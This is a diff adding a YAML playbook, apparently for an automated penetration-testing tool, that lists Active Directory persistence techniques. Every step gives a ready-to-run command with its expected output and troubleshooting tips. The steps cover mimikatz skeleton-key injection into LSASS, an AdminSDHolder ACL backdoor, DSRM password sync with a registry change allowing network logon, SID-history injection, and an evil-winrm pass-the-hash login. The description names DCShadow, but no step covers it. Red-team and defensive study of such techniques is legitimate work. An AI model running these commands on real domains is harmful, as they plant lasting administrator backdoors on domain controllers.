@@ -1,0 +1,81 @@
+id: domain-persistence
+name: Active Directory Domain Persistence
+category: ad
+description: High-impact Active Directory persistence mechanisms including Skeleton Key injection, DCShadow rogue DC replication, AdminSDHolder ACL backdoors, DSRM password sync, and SID History injection.
+port_triggers:
+  - 88
+  - 389
+  - 445
+service_triggers:
+  - ldap
+  - kerberos
+  - ad
+requires_shell: true
+target_os: windows
+tags:
+  - persistence
+  - skeleton-key
+  - dcshadow
+  - adminsdholder
+  - dsrm
+  - sid-history
+steps:
+  - id: persist-skeleton-key
+    title: Inject Skeleton Key into LSASS on Domain Controller
+    phase: post-exploitation
+    purpose: Patch the LSASS process on the Domain Controller to inject a master password (`mimikatz`) for ALL Active Directory domain accounts simultaneously without changing user passwords.
+    command: mimikatz.exe "privilege::debug" "misc::skeleton" exit
+    expected_output:
+      - 'Privilege ''20'' OK'
+      - 'Patching Kerberos for [DOMAIN]'
+      - 'Patching NTLM for [DOMAIN]'
+      - 'Skeleton Key injected'
+    common_mistakes:
+      - Requires DA / SYSTEM shell on the Domain Controller directly.
+      - Resets on Domain Controller reboot.
+    if_success: Master password `mimikatz` is now active for all domain users via NTLM and Kerberos.
+    if_failure: LSASS protected by RunAsPPL or EDR blocked in-memory patching.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/skeleton-key
+
+  - id: persist-adminsdholder
+    title: AdminSDHolder ACL Backdoor Injection
+    phase: post-exploitation
+    purpose: Add GenericAll permissions for an unprivileged user on `CN=AdminSDHolder,CN=System,DC=corp,DC=local`. The SDProp process will automatically grant DA access every 60 minutes.
+    command: powershell -ep bypass -c "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC={{DOMAIN|corp,DC=local}}' -PrincipalIdentity '{{USERNAME}}' -Rights All -Verbose"
+    expected_output:
+      - 'VERBOSE: Adding Rights All on AdminSDHolder for {{USERNAME}}'
+    common_mistakes:
+      - Wait up to 60 minutes for SDProp process to cycle or force SDProp via LDAP trigger.
+    if_success: Unprivileged user will automatically regain full control of all Protected Groups (Domain Admins, Enterprise Admins).
+    if_failure: Insufficient permissions to modify AdminSDHolder container.
+    references:
+      - https://wadcoms.github.io/
+
+  - id: persist-dsrm-sync
+    title: Directory Services Restore Mode (DSRM) Persistence
+    phase: post-exploitation
+    purpose: Synchronize the local DSRM administrator password with a domain account and enable network logon (behavior 2) to maintain a stealthy local admin backdoor on DCs.
+    command: powershell -ep bypass -c "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DsrmAdminLogonBehavior' -Value 2 -Type DWord; ntdsutil \"set dsrm password\" \"sync from domain account {{USERNAME}}\" q q"
+    expected_output:
+      - 'Password for DSRM Administrator account synchronized successfully'
+    common_mistakes:
+      - Must set `DsrmAdminLogonBehavior=2` in registry or DSRM login is only allowed when booting into DSRM safe mode.
+    if_success: DSRM admin backdoor active. Authenticate via `evil-winrm -u Administrator -H <HASH> -i <DC_IP>`.
+    if_failure: Registry modification restricted by local policy.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dsrm-persistence
+
+  - id: persist-sid-history
+    title: SID History Injection via Mimikatz
+    phase: post-exploitation
+    purpose: Inject the Domain Admins SID (`S-1-5-21-...-512`) into an unprivileged user's `sIDHistory` attribute to grant administrative rights silently.
+    command: mimikatz.exe "privilege::debug" "sid::add /sam:{{USERNAME}} /new:Domain Admins" exit
+    expected_output:
+      - 'sIDHistory modified successfully'
+    common_mistakes:
+      - Requires domain trust or schema-level privileges if done across trusts.
+    if_success: Target standard user now possesses Domain Admin token privileges when logging in!
+    if_failure: DC Auditing or protected account restriction.
+    references:
+      - https://wadcoms.github.io/
